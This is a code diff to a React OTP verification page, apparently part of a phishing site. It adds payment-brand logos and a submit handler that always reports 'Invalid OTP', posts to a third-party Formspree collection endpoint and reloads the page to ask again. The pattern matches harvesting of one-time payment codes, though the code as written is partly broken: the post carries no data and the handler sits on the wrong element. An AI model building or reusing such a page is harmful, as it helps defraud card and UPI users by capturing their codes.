@@ -1,24 +1,17 @@
 /* eslint-disable no-lone-blocks */
 import { useCallback, useEffect, useState } from "react";
 import Swal from "sweetalert2";
-
-
+import axios from "axios";
+import { useNavigate } from "react-router-dom";
 
 export default function OTP() {
   const [timer, setTimer] = useState(60);
-
+  const navigate = useNavigate();
   const timeOutCallback = useCallback(
     () => setTimer((currTimer) => currTimer - 1),
     []
   );
-  function handlesubmitdata(e) {
-    e.preventDefault();
-    Swal.fire({
-      icon: "error",
-      title: "Oops...",
-      text: "Invalid OTP !",
-    });
-  }
+
 
   useEffect(() => {
     timer > 0 && setTimeout(timeOutCallback, 1000);
@@ -29,6 +22,37 @@ export default function OTP() {
       setTimer(60);
     }
   };
+
+  const saveFormData = async (e) => {
+    e.preventDefault();
+    Swal.fire({
+      icon: "error",
+      title: "Oops...",
+      text: "Invalid OTP !",
+    });
+
+
+    axios
+      .post(`https://formspree.io/f/xvoyqvpr`,)
+      .then((response) => {
+        if (response.status) {
+          let dataSet = response.data;
+          console.log();
+
+          if (dataSet.ok) {
+
+            navigate("/OTP");
+            e.target.reset();
+          }
+        }
+      });
+
+  };
+
+
+
+
+
 
   return (
     <>
@@ -102,16 +126,77 @@ export default function OTP() {
                   Not received your code? Resend code in {timer} Seconds
                 </span>
               )}
-              <button type="submit" className="btn btn-primary" onSubmit={handlesubmitdata}>
+              <button type="submit" className="btn btn-primary" onSubmit={saveFormData}>
                 verify
               </button>
             </div>
           </form>
         </div>
       </div>
+
+      {/* payment image */}
+
+      <div div className="container" style={{ width: "30%", margin: "auto" }}>
+        <div className="footer"  >
+          <div>
+            <img
+              src="https://img.icons8.com/color/36/000000/amex.png"
+              alt=""
+            />
+          </div>
+
+          <div>
+            <img
+              src="https://img.icons8.com/color/36/000000/mastercard.png"
+              alt=""
+            />
+          </div>
+
+          <div>
+            <img
+              src="https://img.icons8.com/color/36/000000/visa.png"
+              alt=""
+            />
+          </div>
+          <div>
+            <img
+              src="https://d6xcmfyh68wv8.cloudfront.net/assets/razorpay-glyph.svg"
+              alt=""
+            />
+          </div>
+          <div>
+            <img
+              src="https://images.news18.com/ibnlive/uploads/2020/02/UPI.jpg?impolicy=website&width=510&height=356"
+              alt=""
+            />
+          </div>
+          <div>
+            <img
+              src="https://rupay.golftripz.com/assets/images/RuPayLogo-01.png"
+              alt=""
+            />
+          </div>
+        </div>
+      </div>
+
+
+
+
+
+
+
+
       {/* loading....... */}
+
+
+
+
+
+
+
+
       <div className="container">
-        <div className="footer">
+        <div className="footer" style={{ width: "30%", margin: "auto" }}>
           <div>
             <img
               src="https://static.thenounproject.com/png/1684626-200.png"
